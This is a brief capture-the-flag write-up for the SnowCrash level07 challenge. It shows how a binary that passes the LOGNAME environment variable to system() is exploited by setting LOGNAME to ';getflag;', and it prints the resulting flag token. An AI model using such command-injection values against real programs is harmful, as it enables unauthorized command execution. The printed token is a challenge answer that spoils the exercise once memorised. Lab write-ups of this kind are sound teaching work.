### Exploit

For this level, we find a binary file `level07`. As we execute it, it simply prints "level07" out. It does so because in fact, it prints the value the environment variable "$LOGNAME" is set to. Not convinced yet?
```
    level07@SnowCrash:~$ env
    [...]
    LOGNAME=level07
    [...]
    level07@SnowCrash:~$ export LOGNAME="flag07"
    level07@SnowCrash:~$ ./level07
    flag07
```
Thankfully, the executable also call the function `system` which, remember, executes a shell command. [asprintf](http://man7.org/linux/man-pages/man3/asprintf.3.html) copies the logname with the echo command into a buffer, which is then executed.

```
    level07@SnowCrash:~$ export LOGNAME=";getflag;"
    level07@SnowCrash:~$ ./level07

    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Wow-oh, we're halfway the-re.
